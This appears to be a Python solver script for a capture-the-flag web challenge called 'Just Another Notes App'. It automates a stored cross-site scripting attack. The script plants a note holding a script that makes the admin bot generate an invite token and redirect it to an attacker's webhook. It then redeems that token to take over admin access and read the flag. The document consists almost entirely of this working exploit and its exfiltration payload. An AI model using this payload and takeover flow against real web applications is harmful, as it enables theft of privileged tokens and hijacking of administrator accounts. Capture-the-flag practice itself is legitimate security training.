import requests
import argparse
import sys
from urllib.parse import quote

# Configuration
BASE_URL = "https://notes.chals.nitectf25.live"
# Update this with your webhook URL
WEBHOOK_URL = "https://webhook.site/YOUR-ID" 

def register_user(session, username, password):
    print(f"[*] Registering user: {username}")
    r = session.post(f"{BASE_URL}/register", data={
        "username": username,
        "password": password
    })
    return r.status_code == 200

def login_user(session, username, password):
    print(f"[*] Logging in as: {username}")
    r = session.post(f"{BASE_URL}/login", data={
        "username": username,
        "password": password
    })
    return "session" in session.cookies

def create_note(session, content):
    print(f"[*] Creating malicious note...")
    r = session.post(f"{BASE_URL}/create_note", data={
        "content": content
    })
    if r.status_code == 200:
        # Assuming the note URL is returned or predictable. 
        # In many CTFs, it redirects to the note or returns the ID.
        # We'll scrape the response or history to find the note URL.
        if r.history:
            note_url = r.url
        else:
            # Fallback: try to parsing the response if it lists notes
            pass 
        print(f"[+] Note created!")
        return r.url
    return None

def accept_invite_and_get_flag(token):
    s = requests.Session()
    # Create a new user for the admin account
    admin_user = "admin_takeover_" + token[:6]
    password = "password"
    
    register_user(s, admin_user, password)
    login_user(s, admin_user, password)
    
    print(f"[*] Accepting invite with token: {token}")
    r = s.post(f"{BASE_URL}/accept_invite", data={"token": token})
    
    print(f"[*] Accessing /admin...")
    r = s.get(f"{BASE_URL}/admin")
    
    if "nite{" in r.text:
        print("\n[+] FLAG FOUND:")
        print(r.text.split("nite{")[1].split("}")[0]) # naive extraction
        print(f"Full Flag: nite{{{r.text.split('nite{')[1].split('}')[0]}}}")
    else:
        # Check cookies
        for cookie in s.cookies:
            if "flag" in cookie.name or "nite" in cookie.value:
                print(f"\n[+] Flag in cookie: {cookie.value}")
                return
        print("[-] Flag not found in response text or cookies.")
        print(r.text)

def main():
    parser = argparse.ArgumentParser(description="Solver for Just Another Notes App")
    subparsers = parser.add_subparsers(dest="command")
    
    # Step 1: Create Payload
    parser_payload = subparsers.add_parser("create_payload", help="Create the malicious note and get the URL to submit")
    parser_payload.add_argument("--webhook", required=True, help="Your webhook URL")
    
    # Step 2: Finish
    parser_finish = subparsers.add_parser("finish", help="Use the token to get the flag")
    parser_finish.add_argument("--token", required=True, help="The invite token received on your webhook")
    
    args = parser.parse_args()
    
    if args.command == "create_payload":
        s = requests.Session()
        username = "hacker_" + requests.utils.quote(args.webhook[-5:])
        password = "password"
        
        register_user(s, username, password)
        login_user(s, username, password)
        
        payload = f'''
<script>
fetch("/admin/generate_invite", {{
    method: "POST", 
    headers: {{"Content-Type": "application/json"}}, 
    body: "{{}}"
}})
.then(r=>r.json())
.then(d=>{{
  fetch("/getToken")
  .then(r=>{{
      location="{args.webhook}?token="+encodeURIComponent(r.url)
  }})
}})
</script>
'''
        # Note: The challenge might filter scripts or require specific encoding.
        # Based on the writeup, standard script tags work.
        
        url = create_note(s, payload)
        if url:
            print(f"\n[+] Malicious Note URL: {url}")
            print(f"[*] Now submit this URL to the admin bot using ncat.")
            print(f"[*] Wait for the token to arrive at {args.webhook}")
            print(f"[*] Then run: python3 solve.py finish --token <RECEIVED_TOKEN>")
            
    elif args.command == "finish":
        accept_invite_and_get_flag(args.token)
        
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
